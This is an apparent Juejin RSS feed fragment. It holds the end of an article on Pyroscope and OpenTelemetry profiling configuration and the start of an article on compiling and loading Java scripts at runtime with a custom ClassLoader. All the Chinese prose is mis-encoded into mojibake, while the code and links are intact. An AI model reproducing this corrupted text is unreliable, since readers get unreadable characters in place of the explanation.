<span class="hljs-attr">PYROSCOPE_SERVER_ADDRESS</span>=<span class="hljs-string">"http://datakit-service.datakit:9529"</span> \
java -javaagent:opentelemetry-javaagent.jar -jar springboot-server.jar
</code></pre>
<p>æŒ‰ç…§å®é™…ä¸šåŠ¡éœ€æ±‚é€‰æ‹©åˆé€‚çš„å‚æ•°ï¼š</p>
<ul>
<li>opentelemetry-java ç›¸å…³å‚æ•°å‚è€ƒÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fopentelemetry.io%2Fdocs%2Flanguages%2Fjava%2Fconfiguration%2F%23environment-variables-and-system-properties" target="_blank" title="https://opentelemetry.io/docs/languages/java/configuration/#environment-variables-and-system-properties" ref="nofollow noopener noreferrer">OpenTelemetry å®˜æ–¹æ–‡æ¡£</a>ã€‚</li>
<li>pyroscope ç›¸å…³å‚æ•°å‚è€ƒÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgrafana.com%2Fdocs%2Fpyroscope%2Flatest%2Fconfigure-client%2Flanguage-sdks%2Fjava%2F%23configuration-options" target="_blank" title="https://grafana.com/docs/pyroscope/latest/configure-client/language-sdks/java/#configuration-options" ref="nofollow noopener noreferrer">Pyroscope å®˜æ–¹æ–‡æ¡£</a>ï¼Œéƒ¨åˆ†å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š</li>
</ul>
<p><strong>é…ç½®è¯´æ˜</strong></p>

















































































<table><thead><tr><th>Flag</th><th>Description</th></tr></thead><tbody><tr><td>PYROSCOPE_AGENT_ENABLED</td><td>å¯ç”¨ä»£ç†ã€‚é»˜è®¤å€¼ä¸ºtrueã€‚</td></tr><tr><td>PYROSCOPE_SERVER_ADDRESS</td><td>ä¸ŠæŠ¥åœ°å€</td></tr><tr><td>PYROSCOPE_FORMAT</td><td>è®¾ç½®åˆ†æå™¨è¾“å‡ºæ ¼å¼ã€‚é»˜è®¤å€¼ä¸ºcollapsedï¼Œä½†ä¸ºäº†æ”¯æŒå¤šç§æ ¼å¼ï¼Œå¿…é¡»å°†å…¶è®¾ç½®ä¸ºjfrã€‚</td></tr><tr><td>PYROSCOPE_PROFILER_EVENT</td><td>è®¾ç½®åˆ†æå™¨äº‹ä»¶ã€‚åœ¨å¯ç”¨JFRæ ¼å¼æ—¶ï¼Œæ­¤äº‹ä»¶æŒ‡å¯èƒ½çš„CPUåˆ†æäº‹ä»¶ä¹‹ä¸€ï¼šitimerã€cpuã€wallã€‚é»˜è®¤å€¼ä¸ºitimerã€‚</td></tr><tr><td>PYROSCOPE_PROFILER_ALLOC</td><td>è®¾ç½®æ³¨å†Œäº‹ä»¶çš„åˆ†é…é˜ˆå€¼ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼Œç›¸å½“äºasync-profilerä¸­çš„--alloc=ï¼‰ã€‚é»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸²ï¼ˆ""ï¼‰ï¼Œè¡¨ç¤ºç¦ç”¨åˆ†é…åˆ†æã€‚å°†å…¶è®¾ç½®ä¸º0å°†æ³¨å†Œæ¯ä¸ªäº‹ä»¶ï¼Œå¯¼è‡´æ˜¾è‘—çš„CPUå’Œç½‘ç»œå¼€é”€ï¼Œä¸é€‚åˆç”Ÿäº§ç¯å¢ƒã€‚å»ºè®®çš„èµ·å§‹å€¼ä¸º512kï¼Œå¹¶æ ¹æ®éœ€è¦è¿›è¡Œè°ƒæ•´ã€‚</td></tr><tr><td>PYROSCOPE_PROFILER_LOCK</td><td>è®¾ç½®æ³¨å†Œäº‹ä»¶çš„é”é˜ˆå€¼ï¼ˆä»¥çº³ç§’ä¸ºå•ä½ï¼Œç›¸å½“äºasync-profilerä¸­çš„--lock=ï¼‰ã€‚é»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸²ï¼ˆ""ï¼‰ï¼Œè¡¨ç¤ºç¦ç”¨é”åˆ†æã€‚å°†å…¶è®¾ç½®ä¸º0å°†æ³¨å†Œæ¯ä¸ªäº‹ä»¶ï¼Œå¯¼è‡´æ˜¾è‘—çš„CPUå’Œç½‘ç»œå¼€é”€ï¼Œä¸é€‚åˆç”Ÿäº§ç¯å¢ƒã€‚å»ºè®®çš„èµ·å§‹å€¼ä¸º10msï¼Œå¹¶æ ¹æ®éœ€è¦è¿›è¡Œè°ƒæ•´ã€‚</td></tr><tr><td>PYROSCOPE_CONFIGURATION_FILE</td><td>è®¾ç½®é¢å¤–çš„å±æ€§é…ç½®æ–‡ä»¶ã€‚é»˜è®¤å€¼ä¸ºpyroscope.propertiesã€‚</td></tr><tr><td>PYROSCOPE_BASIC_AUTH_USER</td><td>HTTP Basicèº«ä»½éªŒè¯ç”¨æˆ·åã€‚é»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸²ï¼ˆ""ï¼‰ï¼Œè¡¨ç¤ºæ— èº«ä»½éªŒè¯ã€‚</td></tr><tr><td>PYROSCOPE_BASIC_AUTH_PASSWORD</td><td>HTTP Basicèº«ä»½éªŒè¯å¯†ç ã€‚é»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸²ï¼ˆ""ï¼‰ï¼Œè¡¨ç¤ºæ— èº«ä»½éªŒè¯ã€‚</td></tr><tr><td>PYROSCOPE_TENANT_ID</td><td>pyroscopeç§Ÿæˆ·IDï¼Œä½œä¸ºX-Scope-OrgID HTTPå¤´ä¼ é€’ã€‚é»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸²ï¼ˆ""ï¼‰ï¼Œè¡¨ç¤ºæ— ç§Ÿæˆ·IDã€‚</td></tr><tr><td>PYROSCOPE_HTTP_HEADERS</td><td>é¢å¤–çš„HTTPå¤´ï¼ˆä»¥JSONæ ¼å¼ï¼‰ï¼Œä¾‹å¦‚ï¼š{"X-Header": "Value"}ã€‚é»˜è®¤å€¼ä¸º{}ï¼Œè¡¨ç¤ºæ— é¢å¤–å¤´ã€‚</td></tr><tr><td>PYROSCOPE_LABELS</td><td>è®¾ç½®ä»¥é€—å·åˆ†éš”çš„key=valueå¯¹å½¢å¼çš„é™æ€æ ‡ç­¾ã€‚é»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸²ï¼ˆ""ï¼‰ï¼Œè¡¨ç¤ºæ— æ ‡ç­¾ã€‚</td></tr><tr><td>PYROSCOPE_LOG_LEVEL</td><td>ç¡®å®šPyroscopeæ—¥å¿—è®°å½•å™¨çš„è¯¦ç»†ç¨‹åº¦ã€‚å¯ç”¨é€‰é¡¹åŒ…æ‹¬debugã€infoã€warnå’Œerrorã€‚é»˜è®¤å€¼ä¸ºinfoã€‚</td></tr><tr><td>PYROSCOPE_PUSH_QUEUE_CAPACITY</td><td>æŒ‡å®šåœ¨ç½‘ç»œä¸­æ–­æœŸé—´ä¸´æ—¶åœ¨å†…å­˜ä¸­å­˜å‚¨åˆ†ææ•°æ®çš„æ‘„å–é˜Ÿåˆ—çš„å¤§å°ã€‚é»˜è®¤å€¼ä¸º8ã€‚</td></tr><tr><td>PYROSCOPE_INGEST_MAX_TRIES</td><td>è®¾ç½®åœ¨å¤±è´¥æ—¶é‡è¯•æ‘„å–APIè°ƒç”¨çš„æœ€å¤§æ¬¡æ•°ã€‚å€¼ä¸º-1è¡¨ç¤ºé‡è¯•å°†ç»§ç»­è¿›è¡Œï¼Œç›´åˆ°æˆåŠŸã€‚é»˜è®¤å€¼ä¸º8ã€‚</td></tr><tr><td>PYROSCOPE_EXPORT_COMPRESSION_LEVEL_JFR</td><td>è®¾ç½®ä¸Šä¼ åˆ°JFRæ–‡ä»¶çš„GZIPå‹ç¼©çº§åˆ«ã€‚æ­¤é€‰é¡¹æ¥å—çš„å€¼åŒ…æ‹¬NO_COMPRESSIONã€BEST_SPEEDã€BEST_COMPRESSIONå’ŒDEFAULT_COMPRESSIONã€‚</td></tr><tr><td>PYROSCOPE_EXPORT_COMPRESSION_LEVEL_LABELS</td><td>ä¸PYROSCOPE_EXPORT_COMPRESSION_LEVEL_JFRç±»ä¼¼ï¼Œä½†é€‚ç”¨äºåŠ¨æ€æ ‡ç­¾éƒ¨åˆ†ã€‚é»˜è®¤å€¼ä¸ºBEST_SPEEDã€‚</td></tr><tr><td>PYROSCOPE_GC_BEFORE_DUMP</td><td>å¸ƒå°”å€¼ï¼Œå½“è®¾ç½®ä¸ºtrueæ—¶ï¼Œåœ¨è½¬å‚¨åˆ†ææ–‡ä»¶ä¹‹å‰æ‰§è¡ŒSystem.gc()å‘½ä»¤ã€‚æ­¤é€‰é¡¹å¯èƒ½å¯¹å®æ—¶åˆ†ææœ‰ç”¨ï¼Œä½†é»˜è®¤æƒ…å†µä¸‹æ˜¯ç¦ç”¨çš„ã€‚</td></tr></tbody></table>
<h2 data-id="heading-10">æ•ˆæœæ¼”ç¤º</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13dc5261881647d6a8d7c603f827bc01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400862&amp;x-signature=FxhYAdM3EVpxTrEqPRmqqBvrXEI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6490ba115d4c49109cf4749a51eb1820~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400862&amp;x-signature=7uVIj1fJht6LrldwNSgRPQddxUk%3D" alt="" loading="lazy"/></p>
<p>è§‚æµ‹äº‘åœ¨é‡‡é›† profiling æ•°æ®æ—¶å¯ä»¥é€šè¿‡ä¸€äº›é…ç½®å®ç° profiling ä¸ tracing æ•°æ®çš„å…³è”ï¼Œå…¶åŸç†ä¸»è¦æ˜¯é€šè¿‡ç»™ profiling å’Œ tracing æ³¨å…¥ runtime_id æ ‡ç­¾å®ç°å…³è”ï¼Œåœ¨é“¾è·¯ä¸­å¯ä»¥ç‚¹å‡»ä»£ç çƒ­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°å…³è”çš„ profiling ä¿¡æ¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e15a9f6c8734dc0bc73a17bec02d0b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400862&amp;x-signature=1z%2BADtYxiGuRJGFA04FGgDpXTfw%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è‡ªå®šä¹‰ ClassLoader åŠ¨æ€åŠ è½½ï¼šä¸é‡å¯å°±èƒ½åŠ è½½æ–°ä»£ç ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7582923861768601650</link>    <guid>https://juejin.cn/post/7582923861768601650</guid>    <pubDate>2025-12-14T00:11:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582923861768601650" data-draft-id="7582955784569946163" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è‡ªå®šä¹‰ ClassLoader åŠ¨æ€åŠ è½½ï¼šä¸é‡å¯å°±èƒ½åŠ è½½æ–°ä»£ç ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯,é¢è¯•,æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-14T00:11:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¸æµªæ— ç—•"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è‡ªå®šä¹‰ ClassLoader åŠ¨æ€åŠ è½½ï¼šä¸é‡å¯å°±èƒ½åŠ è½½æ–°ä»£ç ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¸æµªæ— ç—•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T00:11:47.000Z" title="Sun Dec 14 2025 00:11:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    18
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>æœ¬æ–‡å°†å¸¦ä½ ç”¨ 300 è¡Œä»£ç ï¼Œäº²æ‰‹å®ç° JVM çº§åˆ«çš„åŠ¨æ€ä»£ç åŠ è½½èƒ½åŠ›ï¼Œå¹¶çœ‹æ¸…å®ƒçš„ä»£ä»·ã€‚</strong></p>
<p>å…¨ç¨‹åªä½¿ç”¨ <code>javax.tools.JavaCompiler</code> å’Œæ ‡å‡† ClassLoaderï¼Œé›¶ç¬¬ä¸‰æ–¹ä¾èµ–ï¼ŒJDK 8+ å¼€ç®±å³ç”¨ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€åŒä¸€ä¸ªé—®é¢˜ï¼Œä¸åŒçš„è§£æ³•</h2>
<p>é¡¹ç›®ä¸­ç»å¸¸æœ‰è¿™æ ·çš„éœ€æ±‚ï¼šè¿è¥é…ç½®ä¸€æ®µè§„åˆ™è„šæœ¬ï¼Œç³»ç»Ÿèƒ½ç›´æ¥æ‰§è¡Œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">rule</span> <span class="hljs-operator">=</span> <span class="hljs-string">"if (amount &gt; 100) amount * 0.8"</span>;
<span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> engine.execute(rule);  <span class="hljs-comment">// æ€ä¹ˆè®©å­—ç¬¦ä¸²å˜æˆå¯æ‰§è¡Œä»£ç ï¼Ÿ</span>
</code></pre>
<p>ä¸Šä¸€ç¯‡æ–‡ç« ã€Š<a href="https://juejin.cn/post/7582814236584329254" target="_blank" title="https://juejin.cn/post/7582814236584329254">QLExpress å¦‚ä½•åšåˆ°ä¸ç¼–è¯‘å°±èƒ½æ‰§è¡Œï¼Ÿ</a>ã€‹è®²äº†è§£é‡Šæ‰§è¡Œçš„æ–¹æ¡ˆï¼šæŠŠè„šæœ¬è§£ææˆ AST æ ‘ï¼Œç”¨ Java ä»£ç éå†æ‰§è¡Œï¼Œä¸ç”Ÿæˆ class æ–‡ä»¶ã€‚</p>
<p>è¿™ä¸€ç¯‡æ¢ä¸ªæ€è·¯ï¼š<strong>èƒ½ä¸èƒ½æŠŠè„šæœ¬ç¼–è¯‘æˆçœŸæ­£çš„ class æ–‡ä»¶ï¼Œç„¶ååŠ è½½æ‰§è¡Œï¼Ÿ</strong></p>
<p>å¬èµ·æ¥å¾ˆé…·ï¼Œä½†æœ‰ä¸‰ä¸ªé—®é¢˜ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> <span class="hljs-string">"public class Script { ... }"</span>;

<span class="hljs-comment">// é—®é¢˜1ï¼šæ€ä¹ˆç¼–è¯‘ï¼ŸJava æºç å˜æˆå­—èŠ‚ç </span>
<span class="hljs-type">byte</span>[] classBytes = compile(code);

<span class="hljs-comment">// é—®é¢˜2ï¼šæ€ä¹ˆåŠ è½½ï¼Ÿå­—èŠ‚ç å˜æˆ Class å¯¹è±¡</span>
Class&lt;?&gt; clazz = load(classBytes);

<span class="hljs-comment">// é—®é¢˜3ï¼šæ€ä¹ˆæ‰§è¡Œï¼Ÿè°ƒç”¨ Class çš„æ–¹æ³•</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> clazz.execute();
</code></pre>
<p>èŠ±äº†ä¸€å¤©æ‰‹å†™ 300 è¡Œä»£ç éªŒè¯ï¼Œè¿™ä¸ªæ€è·¯å®Œå…¨å¯è¡Œã€‚åæ¥å‘ç°ï¼š<strong>è¿™å°±æ˜¯ Groovy çš„åšæ³•ã€‚</strong></p>
<p><strong>Groovy æ˜¯ä»€ä¹ˆï¼Ÿ</strong> ä¸€é—¨è¿è¡Œåœ¨ JVM ä¸Šçš„åŠ¨æ€è¯­è¨€ï¼Œæœ€å¸¸è§çš„åœºæ™¯æ˜¯ Jenkins Pipeline å’Œ Gradle æ„å»ºè„šæœ¬ã€‚å®ƒçš„æ ¸å¿ƒèƒ½åŠ›å°±æ˜¯åŠ¨æ€ç¼–è¯‘æ‰§è¡Œã€‚</p>
<p>æœ¬æ–‡æ‰‹å†™çš„å®ç°ç§°ä¸º <code>DynamicScriptRunner</code>ï¼Œå±•ç¤º Groovy ç­‰è„šæœ¬å¼•æ“çš„åº•å±‚åŸç†ï¼Œå…¨ç¨‹åªç”¨ JDK è‡ªå¸¦å·¥å…·ï¼Œé›¶ä¾èµ–ã€‚</p>
<h2 data-id="heading-1">äºŒã€æ•´ä½“æµç¨‹</h2>
<p>æŠŠè„šæœ¬æ‰§è¡Œåˆ†æˆäº”ä¸ªé˜¶æ®µï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[è„šæœ¬å­—ç¬¦ä¸²] --&gt;|1.åŒ…è£…| B[Javaæºç ]
    B --&gt;|2.ç¼–è¯‘| C[å†…å­˜å­—èŠ‚ç ]
    C --&gt;|3.åŠ è½½| D[Classå¯¹è±¡]
    D --&gt;|4.åå°„| E[æ‰§è¡Œç»“æœ]
    
    style A fill:#e1f5ff,stroke:#01579b,stroke-width:2px
    style B fill:#fff9c4,stroke:#f57f17,stroke-width:2px
    style C fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    style D fill:#e8f5e9,stroke:#1b5e20,stroke-width:2px
    style E fill:#ffebee,stroke:#b71c1c,stroke-width:2px
</code></pre>
<p><strong>ä¸¾ä¸ªä¾‹å­</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è¾“å…¥è„šæœ¬</span>
<span class="hljs-string">"if (amount &gt; 100) MyMath.discount(amount, 0.8)"</span>

<span class="hljs-comment">// ä¸Šä¸‹æ–‡</span>
amount = <span class="hljs-number">150</span>
MyMath = MyMath.class

<span class="hljs-comment">// æ‰§è¡Œæµç¨‹</span>
è„šæœ¬å­—ç¬¦ä¸² â†’ åŒ…è£…æˆJavaç±» â†’ ç¼–è¯‘æˆå­—èŠ‚ç  â†’ åŠ è½½æˆClass â†’ åå°„æ‰§è¡Œ â†’ è¿”å›<span class="hljs-number">120.0</span>
</code></pre>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€å…³é”®æŠ€æœ¯ç‚¹è¯¦è§£</h2>
<h3 data-id="heading-3">æŠ€æœ¯ç‚¹ä¸€ï¼šè„šæœ¬åŒ…è£…æˆ Java æºç </h3>
<p><strong>åŸå§‹è„šæœ¬</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">if</span> (amount &gt; <span class="hljs-number">100</span>) MyMath.discount(amount, <span class="hljs-number">0.8</span>)
</code></pre>
<p><strong>åŒ…è£…åçš„ Java æºç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Script_1702345678</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">(
        java.util.Map&lt;String, Object&gt; context,
        java.util.Map&lt;String, Class&lt;?&gt;&gt; functions
    )</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// æ­¥éª¤1ï¼šä» context æå–å˜é‡å¹¶å£°æ˜</span>
        <span class="hljs-type">Double</span> <span class="hljs-variable">amount</span> <span class="hljs-operator">=</span> (Double) context.get(<span class="hljs-string">"amount"</span>);
        
        <span class="hljs-comment">// æ­¥éª¤2ï¼šä» functions æå–å‡½æ•°ç±»</span>
        Class&lt;?&gt; MyMath = functions.get(<span class="hljs-string">"MyMath"</span>);
        
        <span class="hljs-comment">// æ­¥éª¤3ï¼šæ’å…¥è„šæœ¬ï¼ˆéœ€è¦è½¬æ¢ï¼‰</span>
        <span class="hljs-keyword">return</span> (amount &gt; <span class="hljs-number">100</span>) ? 
            (Double) MyMath.getMethod(<span class="hljs-string">"discount"</span>, <span class="hljs-type">double</span>.class, <span class="hljs-type">double</span>.class)
                           .invoke(<span class="hljs-literal">null</span>, amount, <span class="hljs-number">0.8</span>)
            : <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¦åŒ…è£…ï¼Ÿ</strong></p>
<pre><code class="hljs">è„šæœ¬ç‰‡æ®µä¸èƒ½ç›´æ¥ç¼–è¯‘
å¿…é¡»åŒ…è£…æˆå®Œæ•´çš„ç±»
æ‰èƒ½äº¤ç»™ JavaCompiler
</code></pre>
<p><strong>åŒ…è£…ä¸‰æ­¥èµ°</strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[åŸå§‹è„šæœ¬] --&gt; B[æå–å˜é‡]
    A --&gt; C[æå–å‡½æ•°]
    A --&gt; D[è½¬æ¢è°ƒç”¨]
    
    B --&gt; E[ç”ŸæˆJavaæºç ]
    C --&gt; E
    D --&gt; E
    
    style A fill:#e1f5ff,stroke:#01579b,stroke-width:2px
    style B fill:#fff9c4,stroke:#f57f17,stroke-width:2px
    style C fill:#fff9c4,stroke:#f57f17,stroke-width:2px
    style D fill:#fff9c4,stroke:#f57f17,stroke-width:2px
    style E fill:#e8f5e9,stroke:#1b5e20,stroke-width:2px
</code></pre>
<p><strong>è¯¦ç»†è¯´æ˜</strong>ï¼š</p>
<ol>
<li>æå–å˜é‡ï¼šä» context ä¸­æå– amountï¼Œç”Ÿæˆ <code>Double amount = ...</code></li>
<li>æå–å‡½æ•°ï¼šä» functions ä¸­æå– MyMathï¼Œç”Ÿæˆ <code>Class&lt;?&gt; MyMath = ...</code></li>
<li>è½¬æ¢è°ƒç”¨ï¼šæŠŠ <code>MyMath.discount(...)</code> è½¬æ¢æˆåå°„è°ƒç”¨</li>
</ol>
<p><strong>å…³é”®ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> String <span class="hljs-title function_">wrapScript</span><span class="hljs-params">(String className, String script)</span> {
    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
    
    <span class="hljs-comment">// ç±»å®šä¹‰</span>
    sb.append(<span class="hljs-string">"public class "</span>).append(className).append(<span class="hljs-string">" {\n"</span>);
    sb.append(<span class="hljs-string">"    public static Object execute(\n"</span>);
    sb.append(<span class="hljs-string">"        java.util.Map&lt;String, Object&gt; context,\n"</span>);
    sb.append(<span class="hljs-string">"        java.util.Map&lt;String, Class&lt;?&gt;&gt; functions\n"</span>);
    sb.append(<span class="hljs-string">"    ) throws Exception {\n"</span>);
    
    <span class="hljs-comment">// æ³¨å…¥å˜é‡</span>
    <span class="hljs-keyword">for</span> (String varName : context.getVariables().keySet()) {
        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> context.getVariables().get(varName);
        <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> getJavaType(value);  <span class="hljs-comment">// Double, Integer, String</span>
